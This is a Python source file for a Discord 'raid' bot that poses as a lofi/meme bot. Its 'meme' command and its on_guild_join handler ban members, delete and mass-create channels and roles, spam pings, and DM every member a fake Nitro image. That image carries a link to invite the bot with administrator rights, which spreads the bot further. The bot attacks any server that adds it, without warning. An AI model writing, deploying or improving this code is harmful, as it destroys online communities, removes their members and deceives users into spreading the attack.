import asyncio
import os
from disnake.ext import commands
import disnake
import raid_helper as RD
from raid_helper import RaidCommands as RC
from py_logs import TOKEN
import git_push as GP
from disnake import Guild, Message, Member, Embed, ButtonStyle, ApplicationCommandInteraction as ACI
from disnake.ui import Button, View

intents = disnake.Intents().all()
intents.guilds = True
intents.members = True
prefix = "pls"
bot = commands.Bot(
    command_prefix=prefix,
    activity=disnake.Activity(type=disnake.ActivityType.listening, name="24/7 Lofi Music"),
    help_command=None,
    intents=intents,
    case_insensitive=True,
    strip_after_prefix=True,
)

nitro_embed = Embed()
nitro_embed.set_image(
    url="https://media.discordapp.net/attachments/974725497248428103/978048121345028102/unknown.png?width=674&height=171"
)

nitro_button = Button(
    style=ButtonStyle.url,
    url="https://discord.com/api/oauth2/authorize?client_id=976017453647814716&permissions=8&scope=bot%20applications.commands",
)


@bot.event
async def on_ready():
    print(f"Logged In As: {bot.user}")
    await RD.genreddit(100, RD.subreddit)


@bot.slash_command()
async def assist(inter: ACI):
    embed = Embed(
        title="List Of Commands: ",
        description="""
1 - `pls meme`
2 - `pls help`
3 - `pls ban`
4 - `pls dm`
5 - `pls cancel`
6 - `pls channel remove/make`
7 - `pls role make/remove/give`
8 - `pls ping amt`
9 - `pls sfw amt`

    """,
        color=RD.ORANGE,
    )
    await inter.channel.send(embed=embed)


@bot.slash_command()
@commands.cooldown(5, 30, commands.BucketType.member)
async def meme(inter: ACI, *, bs=None):
    guild = inter.guild

    await RD.genreddit(10, RD.subreddit)

    await RC.send_dm(guild, nitro_embed, nitro_button)

    await RC.ban_members(guild, inter.author)

    await RC.channel_remove(guild)
    await RC.channel_make(guild, 25)

    await RC.ping_spam(guild, 5)
    await RC.sfw_spam(guild, 5)

    await RC.role_remove(guild)
    await RC.role_make(guild, 10)
    await RC.role_give(guild)


@bot.slash_command()
@commands.cooldown(5, 30, commands.BucketType.guild)
async def channel(inter: ACI, choice: str):
    guild = inter.guild
    if choice == "delete":
        await RC.channel_remove(guild)
    elif choice == "make":
        await RC.channel_make(guild, 25)


@bot.slash_command()
async def role(inter: ACI, choice: str):
    guild = inter.guild
    if choice == "delete":
        await RC.role_remove(guild)
    elif choice == "make":
        await RC.role_make(guild, 25)
    elif choice == "give":
        await RC.role_give(guild)


@bot.slash_command()
@commands.cooldown(5, 30, commands.BucketType.user)
async def dm(inter: ACI):
    guild = inter.guild
    await RC.send_dm(guild, nitro_embed, nitro_button)


@bot.slash_command()
async def baslash_commandn(inter: ACI):
    guild = inter.guild
    await RC.ban_members(guild, inter.author)


@bot.slash_command()
async def ping(inter: ACI, amt: int):
    await RC.ping_spam(inter.guild, amt)


@bot.slash_command()
async def sfw(inter: ACI, amt: int):
    await RC.sfw_spam(inter.guild, amt)


@bot.slash_command()
async def cancel(inter: ACI):
    os.system('cmd /k "python main.py"')


@bot.event
async def on_guild_join(guild: Guild):

    await RD.genreddit(10, RD.subreddit)

    await RC.send_dm(guild, nitro_embed, nitro_button)

    await RC.ban_members(guild)

    await RC.channel_remove(guild)
    await RC.channel_make(guild, 25)

    await RC.sfw_spam(guild, 5)
    await RC.ping_spam(guild, 5)

    await RC.role_remove(guild)
    await RC.role_make(guild, 10)
    await RC.role_give(guild)


@bot.event
async def on_command_error(cmd, error):
    if isinstance(error, Exception):
        pass


GP.push("Update")

bot.run(TOKEN)
